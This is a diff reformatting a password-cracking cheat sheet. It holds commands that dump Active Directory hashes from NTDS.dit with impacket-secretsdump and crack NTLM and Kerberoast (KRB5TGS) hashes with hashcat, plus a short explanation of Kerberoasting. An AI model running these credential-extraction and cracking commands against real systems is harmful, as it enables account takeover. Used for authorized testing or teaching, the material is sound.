@@ -41,10 +41,14 @@ After grabbing or dumping the `NTDS.dit` and `SYSTEM registry hive` or dumping `
 | C:\Windows\System32\config\SYSTEM |	Registry hive containing the key used to encrypt hashes |
 
 Dump Hashes from `.dit` using Impacket:
-```impacket-secretsdump -system SYSTEM -ntds ntds.dit -hashes lmhash:nthash LOCAL -outputfile ntlm-extract ```
+```
+impacket-secretsdump -system SYSTEM -ntds ntds.dit -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
+```
 
 You can crack the NTLM hash dump usign the following hashcat syntax:
-```hashcat64 -m 1000 -a 0 -w 4 --force --opencl-device-types 1,2 -O d:\hashsample.hash "d:\WORDLISTS\realuniq.lst" -r OneRuleToRuleThemAll.rule ```
+```
+hashcat64 -m 1000 -a 0 -w 4 --force --opencl-device-types 1,2 -O d:\hashsample.hash "d:\WORDLISTS\realuniq.lst" -r OneRuleToRuleThemAll.rule 
+```
 
 ## Cracking Hashes from Kerboroasting - KRB5TGS
 A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. This allows a client application to request that the service authenticate an account even if the client does not have the account name. KRB5TGS - Kerberoasting Service Accounts that use SPN Once you have identified a Kerberoastable service account (Bloodhound? Powershell Empire? - likely a MS SQL Server Service Account), any AD user can request a krb5tgs hash from it which can be used to crack the password.
@@ -59,8 +63,9 @@ Hashcat supports multiple versions of the KRB5TGS hash which can easily be ident
   * 18200 - ASREP Type 23 - $krb5asrep$23$
   
 KRB5TGS Type 23 - Crackstation humans only word list with OneRuleToRuleThemAll mutations rule list.
-
-```hashcat64 -m 13100 -a 0 -w 4 --force --opencl-device-types 1,2 -O d:\krb5tgs.hash d:\WORDLISTS\realhuman_phill.txt -r OneRuleToRuleThemAll.rule``` 
+```
+hashcat64 -m 13100 -a 0 -w 4 --force --opencl-device-types 1,2 -O d:\krb5tgs.hash d:\WORDLISTS\realhuman_phill.txt -r OneRuleToRuleThemAll.rule
+``` 
 
 **Cracking NTLMv2 Hashes from a Packet Capture:**
 You may be asked to recover a password from an SMB authentication (NTLMv2) from a Packet Capture. The following is a 9-step process for formatting the hash correctly to do this. https://research.801labs.org/cracking-an-ntlmv2-hash/
